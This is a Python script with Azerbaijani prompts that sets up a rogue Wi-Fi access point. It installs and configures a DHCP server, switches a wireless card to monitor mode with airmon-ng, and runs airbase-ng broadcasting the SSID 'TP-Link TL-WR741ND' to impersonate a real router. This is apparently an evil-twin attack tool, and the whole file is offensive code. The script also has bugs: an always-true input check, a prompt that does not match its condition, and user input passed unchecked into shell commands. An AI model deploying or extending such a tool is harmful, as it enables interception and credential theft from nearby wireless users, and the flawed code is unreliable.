import os
import subprocess



W  = '\033[0m'  # ağ
R  = '\033[31m' # qırmızı
G  = '\033[32m' # yaşıl

def server():
    while(True):
        if not os.path.isfile('/usr/sbin/dhcpd'):
           yukle = input('['+R+'isc-dhcp-server tapılmadı! İndi yüklənsin? B/X'+W+']')
           if yukle == "B" or "b":
               subprocess.check_output('apt-get -y install isc-dhcp-server' , shell=True)

               print(G+'isc-dhcp-server uğurla yükləndi')

           elif yukle == "Y" or "y":

               print(' ['+R+'Proses təxrə salınır...'+W+']')

               break
           else:
               print("Yenidən yoxlayın")

               continue

        else:
            break



def faylyarat():

    fayl = open("/etc/dhcpd.conf", "w")
    yazi = """authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.1.0 netmask 255.255.255.0 {
option routers 192.168.1.1;
option subnet-mask 255.255.255.0;
option domain-name "TP-Link TL-WR741ND";
option domain-name-servers 192.168.1.1;
range 192.168.1.2 192.168.1.40;
}"""





    fayl.write(yazi)



def airmon():

    os.system("airmon-ng")

    interface = input(G+"Yuxarıdakı İnterface adını yazın.(Varsayılan olaraq 'wlan0'olur) :"+" "+W)

    #os.system("airmon-ng start"+" "+interface)

    subprocess.check_output('airmon-ng start'+' '+interface , shell=True)

    print('['+G+'Monitora çevrilir...'+W+']')

    os.system('airmon-ng')

    moninterface = input(G+interface+" "+"uğurla monitor mode yə çevrildi.Yuxarıdakı Monitor İnterface adını yenidən yazın(Varsayılan olaraq 'wlan0mon olur) :"+" "+W)

    print(G+'Proses başlayır...')

    print(G+ "Növbəti mərhələyə keç . 'service.py' nı açılan terminalda başlad (başlatmaq üçün terminala 'python3 service.py' yaz .Bu Terminalı bağlama. "+W)

    os.system('gnome-terminal')

    os.system('airbase-ng -c 11 -e'+' '+'"TP-Link TL-WR741ND"'+' '+moninterface)